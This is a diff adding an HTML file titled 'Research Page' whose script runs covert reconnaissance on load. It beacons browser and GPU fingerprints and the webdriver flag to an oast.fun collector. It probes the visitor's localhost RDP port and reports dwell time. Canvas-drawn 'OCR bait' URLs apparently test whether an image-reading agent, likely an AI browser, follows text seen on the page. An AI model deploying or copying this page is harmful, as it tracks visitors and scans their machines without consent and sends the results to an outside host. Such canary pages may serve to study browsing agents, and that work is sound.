@@ -1,0 +1,71 @@
+﻿<!DOCTYPE html>
+<html>
+<head><title>Research Page</title></head>
+<body>
+
+<canvas id="c1" width="900" height="100" style="display:block;"></canvas>
+<canvas id="c2" width="900" height="100" style="display:block;"></canvas>
+
+<script>
+  const C = "https://janjakokqvbayjmsqktcwjjfzxz7maiz5.oast.fun";
+
+  function send(tag, data) {
+    navigator.sendBeacon(`${C}/${tag}`, JSON.stringify(data));
+  }
+
+  const start = Date.now();
+
+  // ========== OCR BAIT — SECOND COLLECTOR (char codes only) ==========
+  // TODO: Replace with your 2nd Interactsh token char codes
+  // Generate with: "yourtoken.oast.fun".split('').map(c => c.charCodeAt(0))
+  const ocrHost = String.fromCharCode(
+    // PASTE YOUR SECOND COLLECTOR CHAR CODES HERE
+    // Example: 97,98,99,46,111,97,115,116,46,102,117,110
+  );
+
+  function drawOCR(id, path) {
+    const canvas = document.getElementById(id);
+    const ctx = canvas.getContext('2d');
+    ctx.fillStyle = '#ffffff';
+    ctx.fillRect(0, 0, 900, 100);
+    ctx.fillStyle = '#000000';
+    ctx.font = 'bold 28px Arial';
+    ctx.fillText('https://' + ocrHost + '/' + path, 20, 55);
+  }
+
+  drawOCR('c1', 'ocr-hit-1');
+  drawOCR('c2', 'ocr-hit-2');
+
+  // ========== ENVIRONMENT ==========
+  send("env", {
+    ua: navigator.userAgent,
+    platform: navigator.platform,
+    cores: navigator.hardwareConcurrency,
+    mem: navigator.deviceMemory,
+    screen: `${screen.width}x${screen.height}`,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    webdriver: navigator.webdriver,
+    wasm: typeof WebAssembly !== 'undefined',
+    ls: (() => { try { localStorage.setItem('t','1'); localStorage.removeItem('t'); return true; } catch(e) { return false; } })(),
+    gpu: (() => { try { const g = document.createElement('canvas').getContext('webgl'); const e = g.getExtension('WEBGL_debug_renderer_info'); return g.getParameter(e.UNMASKED_RENDERER_WEBGL); } catch(e) { return 'N/A'; } })()
+  });
+
+  // ========== RDP PROBE ==========
+  const t = performance.now();
+  fetch("http://127.0.0.1:3389/", { mode: "no-cors", signal: AbortSignal.timeout(5000) })
+    .then(() => send("rdp", { status: "open", ms: Math.round(performance.now() - t) }))
+    .catch(e => send("rdp", { status: e.name, ms: Math.round(performance.now() - t) }));
+
+  // ========== DWELL ==========
+  window.addEventListener('beforeunload', () => {
+    navigator.sendBeacon(`${C}/dwell`, JSON.stringify({
+      totalSeconds: Math.round((Date.now() - start) / 1000)
+    }));
+  });
+
+  setTimeout(() => send("alive", { s: 300 }), 300000);
+  setTimeout(() => send("alive", { s: 600 }), 600000);
+
+</script>
+</body>
+</html>
